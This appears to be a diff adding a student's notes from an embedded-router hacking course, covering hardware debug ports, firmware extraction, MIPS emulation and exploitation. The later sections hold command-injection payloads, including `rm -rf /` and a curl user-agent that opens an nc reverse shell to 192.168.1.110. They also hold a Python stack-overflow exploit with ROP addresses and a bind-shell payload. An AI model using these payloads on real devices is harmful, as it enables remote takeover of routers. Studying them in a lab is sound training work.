@@ -1,0 +1,386 @@
+Router used TEW-733GR/A
+http://www.esmt.com.tw/DB/manager/upload/M14D5121632A.pdf
+https://www.anz.ru/files/mediatek/MT7620_Datasheet.pdf
+http://www.axelite.com.tw/Doc/BinaryData.aspx?id=b745bd6d-f0f8-4f04-bf2d-503eae3fa59f
+http://www.zlgmcu.com/mxic/pdf/NOR_Flash_c/MX25L6406E_DS_EN.pdf
+
+Router:
+http://www.amazon.com/TRENDnet-Wireless-Gigabit-Router-TEW-733GR/dp/B00D8AMKKC
+Multimeter:
+http://www.amazon.com/Klein-Tools-MM200-Ranging-Multimeter/dp/B003LCITWA/ref=sr_1_1?s=lamps-light&srs=2594917011&ie=UTF8&qid=1461345137&sr=1-1&keywords=klein+tools+mm200
+http://www.amazon.com/Amprobe-AM-500-Digital-Multimeter/dp/B008E07C1I/ref=sr_1_9?s=pc&ie=UTF8&qid=1461344969&sr=1-9&keywords=multimeter
+
+Teacher Blog:
+http://www.devttys0.com/blog/
+
+Downloads:
+http://devttys0.com/EDE.zip
+http://www.devttys0.com/EVE-1.7-0415.iso
+
+Company Web Site:
+https://www.tacnetsol.com/
+
+CTF:
+https://microcorruption.com/login
+
+Search Engine
+scans.io -> like shodan but larger, use to find vulnerable devices via header
+
+Baidu - China Google
+    good for spec sheets, etc from chinese manufacturers that
+    may not be available in US
+
+FC ID Lookup - can include pictures of internal chips,etc of devices.
+    FCC ID will be on the bottom of a device
+
+Parts Vendors: Digikey, Mouser
+
+Calculate Memory of Ram on Device:
+8M x 16 bit X 4 Banks
+8X16 = 128
+128X4 = 512
+512 / 8 bits = 64 MB
+
+Vcc / Vdd -> Positive Power supply pin
+
+Ground / GND / Vee / Vss - Negative Power Supply pin
+
+"High" or "One"
+    Pin Voltage == Vcc
+
+"low" or "Zero"
+    Pin Voltage == Ground
+
+Header - A multi-pin connector
+Pin out - Pin configuration of a header
+
+Standard Debug Ports:
+    Serial (UART) - 
+        Usually 4 - 6 pins
+            TX, RX, GND and Vcc
+                TX usually will be pulled high (3.3 volts)
+                RX may or may not be pulled high
+                If the measured voltage dips, that's TX
+        Common voltage levels: 1.8, 3.3 and 5 volts
+        Protocol compatible with RS232 not voltage compatible
+        Debug messages / boot loader
+        Interactive root shell
+    JTAG - Joint Test Action Group
+        Typiclly 2 rows of pins (dual row connector)
+        Test connectivity
+        CPU debugging
+        Reading / writing Flash and RAM
+        JTAG Pins:
+            Test Data In
+            Test data Out
+            Test Mode Select
+            Test Clock
+            TAP Reset
+            System Reset
+        Two Registers
+            Instruction Register
+                Fixed length per JTAG device
+            Data Register
+                Variable length, depending on IR
+        Common JTAG Pinouts (slide 99)
+        JTAG Adapter
+            OLimex www.olimex.com
+
+        JTAG Software:
+            UrJTAG  - Does not allow debugging
+            OpenOCD - Allows debugging
+
+            UrJTAG
+                detect
+                discovery
+
+            OpenOCD -f flyswatter2.cfg
+                jtag newtap mips cpu -expected-id 1 -irlen 5
+                target create mips.cpu mips_m4k -endian big -chain-position mips.cpu
+                reset_config trst_and_srst
+
+
+Common Flash Addresses:
+    0x1E000000
+    0x1C000000
+    0x1FC00000
+    0x38000000
+
+SPI Flash pin out:
+    1 CS
+    2 MISO
+    3 WP
+    4 GND
+    5 MOSI
+    6 SCK
+    7 HOLD
+    8 VCC
+
+
+
+Need:
+    multimeter
+    TRENDNet Router TEW-733GR/A
+    TTL-232R-3V3-2MM, www.ftdichip.com 07347
+        USB to TTL Serial Cable(3V3)-1.8m
+        pinout slide 82
+        1 GND  Black
+        2 CTS# Brown
+        3 VCC  RED
+        4 TX   Orange
+        5 RX   Yellow
+        6 RTS# Green
+        8N1 115200, 38400 or 9600 baud rates
+            8 bits, no stop bits, 1 parity bit
+
+	Put Klein Tools Multimeter on mV for checking voltage!!!!! not Vls
+
+    C232HM-DDHSL-0
+        USB to MPSSE Serial cable 3.3V - 0.5m (07691)
+
+    Pomona 5250 SOIC Clip, 8 PIN (1632915)
+    
+
+
+sudo baudrate -p /dev/ttyUSB0 - use to test baudrates
+sudo miniterm.py /dev/ttyUSB0 115200
+
+i
+libmpsse - open source library needed
+
+spiflash -p - shows pinout for usb device plugging into SOIC Clip
+	do not use device power cord or you could fry the device
+	use power from the USB cables
+	send ground from DUAL USB cable to UART Ground
+
+	DUAL USB cable -> Ground goes to UART Ground
+	DUAL USB cable -> 3.3V goes to VCC (Yellow Cable ?) on alligator clip
+	Alligator clip goes on Chip -> Brown cable on pin 1
+	
+spiflash -s $((0x800000)) -r firmware.bin --verify
+	get size from data sheet. If you can't find size guess big
+	https://github.com/devttys0/libmpsse/blob/master/src/examples/spiflash.py
+
+
+U-boot header
+	27 05 19 56
+
+LZMA compressed Kernel
+	5d 00 00 80
+
+binwalk firmware.bin - shows files inside of the firmware
+binwalk -e firmware.bin - extract
+	There is also /opt/firmware-mod-kit/extract-firmware.sh ???? 
+binwalk -E firmware.bin - shows enthropy/encryption
+binwalk -BE firmware.bin - shows file signatures
+binwalk -A firmware.bin - shows common executable opcode signatures
+	
+
+
+MIPS Data Sizes
+	Byte		8 bits
+	Half Word	2 bytes
+	Word		4 bytes
+	Double Word	8 byptes
+
+MIPS Endianess
+	Big	01 02 03 04
+	Little	04 03 02 01
+
+MIPS Registers
+	$a0 - $a3
+
+
+MIPS disassembly
+	objdump
+	IDA Pro
+
+Command Injection
+	system()
+	popen()	- used to execute commands
+	execv("/bin/sh",["sh","-e","%s", NULL])
+		%s means it's a string		
+	system(echo "Hello `rm -rf /`!");
+		In IDA press 'x' to see system calls???
+	
+	
+	Shift-F12 to see strings
+		Might contain commands at OS level
+http://www.amazon.com/TRENDnet-Wireless-Gigabit-Router-TEW-733GR/dp/B00D8AMKKC
+	Show path to popen or system
+	In IDA In IDA press 'g' and type in Main, Goto View Menu -> Graphs -> 			paths Find from the current function to ... -> select popen
+		allycat plugin written by teacher...github site
+
+
+	`reboot` in login, user-agent and other form fields
+
+
+
+IDA Plugins
+https://github.com/devttys0/ida/tree/master/plugins
+	includes allycat and others
+
+
+Emulation
+	Qemu -> Supports many architectures
+ 		User space emulation
+		system emulation
+
+		chroot Qemu inside fireware directory
+		cd into firmware direcotry
+		cp $(which qemu-mipsel) .
+		sudo chroot . ./qemu-mipsel /bin/busybox
+		
+			Qemu -E -> lets you set env variables
+				QUERY_STRING
+				HTTP_METHOD
+				HTTP_COOKIE
+				SCRIPT_FILENAME
+			qemu -g option -> Enable Debugging
+
+	sudo chroot . ./qemu-mipsel -E HTTP_USER_AGENT=BLA -E foo=bar -g 8000 /www/apply.cgi
+			-g 8000 -> open port for debug server
+	sudo chroot . ./qemu-mipsel -E HTTP_USER_AGENT='`reboot`' -E REMOTE_ADDR=172.16.5.127 -g 8000 /www/cgi-bin/apply.cgi
+		Goto into IDA
+		Debugger -> Select Remote Debugger
+			put in 127.0.0.1 and port from -g
+		Debugger -> Start Process or Process Options?
+		set break point
+		click "run" (Green triangle in upper left)
+		IDA will stop at break point
+			left click hex view
+			right click "General Registers" address click Jump
+				to see output of breakpoint
+
+
+		
+NVRAM faker -> github.com/zcutlip/nvram-faker
+
+Setting up System VM
+Most MIPS systems will be running 2.6 kernel
+	Get Debian 6.05, Kernel version 2.6.32
+
+	May need LD_PRELOAD
+
+	Botox - waits for process to execute, pauses the process, attaches
+		gdbserver
+		./botox -g foo
+			wait for process foo, attach gdbserver on port 1234
+
+
+	/opt/vm/debian-mipsel/run.sh
+		# run.sh contains:
+			qemu-sys
+	tar -cf rootfs.tar squashfs-root
+	gzip rootfs.tar
+	scp rootfs.tar.gz root@127.0.0.1:/root/
+		user/pw is root/root
+	
+	In VM:
+	tar -xzvf rootfs.tar.gz -> use tar to retain symlinks and permissions
+	cd squashfs-root
+	chroot . ./usr/sbin/lighttpd -f lighttpd.conf
+	#mknod /dev/null c 1 3
+	botox -g apply.cgi
+
+	netcat listener:
+	nc -nvlp 1267
+	Then run against victim (EA2700)
+	curl http://192.168.1.1/apply.cgi --user-agent '`nc 192.168.1.110 1267 -e /bin/sh`'
+	
+
+Stack Overflows:
+	Each function uses the stack for local variables
+	Stack grows down, higher addresses to lower addresses
+	Data is read/written up
+
+	Unsafe functions:
+		sprintf
+		strcpy
+		strcat
+		sscanf
+		bad size fields for memcpy / strncpy / etc
+
+	Want to overwrite $ra
+	strcpy(buf,"A" * 40);
+	
+
+	C program "overflow" code:
+		int main(int argc, char *argv[])
+		{
+			char buf [256];
+			strcpy(buf, argv[1]);
+			return 0;
+		}
+	./vuln $(perl -e 'print "A"x260')BBBB
+	./vuln $(perl -e 'print "A"x260;print "\xA0\x07\x40"')
+		"\xA0\x07\x40" is little endian so it reversed from actual
+		address of 004007A0. Get Address from Export tab in IDA
+
+
+	F9 - to run through program or get to a break point in IDA
+
+ curl http://127.0.0.1/dispatcher.cgi?template=jquery.js.pdf.gz`perl -e 'print "A"x1295'`
+
+
+Stack is randomized since Linux 2.6
+Libraries are randomized since 2.6.36
+
+ret2libc -> easiest way to exploit stack overflow
+	want to call system("evil command")
+	$a0 must contain a pointer to our "evil command"
+
+ROP -> Return oriented programming
+	IDS Plugin -> Search for "mips rop gadgets"
+
+
+cat /proc/<pid>/maps to find memory address
+	run botox, then run program, then attach IDA debugger (break point in 
+		main), then cat /proc/<pid>/maps 
+	Look for libuClibc
+		Find libuClibc that has X (execute) permission on it
+		get that memory address
+Python program
+import urllib2
+url = 'http://127.0.0.1/dispatcher.cgi?template=jquery.jsp.pdf.gz' 
+urllib2.urlopen(url)
+
+nc -l -p 8080 -e /bin/sh  (28 characters)
+
+cat /proc/<pid>/maps
+2aed6000-2af2d000 r-xp 00000000 08:01 579276     /root/squashfs-root/lib/libuClibc-0.9.29.so
+
+Python script (remote command execution):
+import urllib2
+url = 'http://127.0.0.1/dispatcher.cgi?template=jquery.jsp.pdf.gz' + 'A' * ((0x530-0x28)-len("common.js.pdf.gz")-len("/www/license/")) + '\xE0\x27\xF2\x2A' + 'B' * 32 + '\xA0\xB7\xEF\x2A' + 'C' * 0x18 + "nc${IFS}-l${IFS}-p${IFS}1234${IFS}-e${IFS}/bin/sh"
+urllib2.urlopen(url)
+
+
+
+li $a0, 1
+move $t9, $s0  (s0 ROP2)
+jalr $t9
+
+
+move $t9, $s1  (s1 addr of sleep)
+jalr $t9
+nop
+move $t9, $s2  (s2 ROP3)
+jalr $t9
+
+ 
+
+addiu $s3, $sp, 0x18    (s3 shellcode)
+move $t9, $s4   (s4 ROP4)
+jalr $t9
+
+
+move $t9, $s3
+jalr $t9
+
+
+bowcaster.payloads.mips -> shellcode for mips
+	however, they all have bad bytes (slide 447)
+
+
+
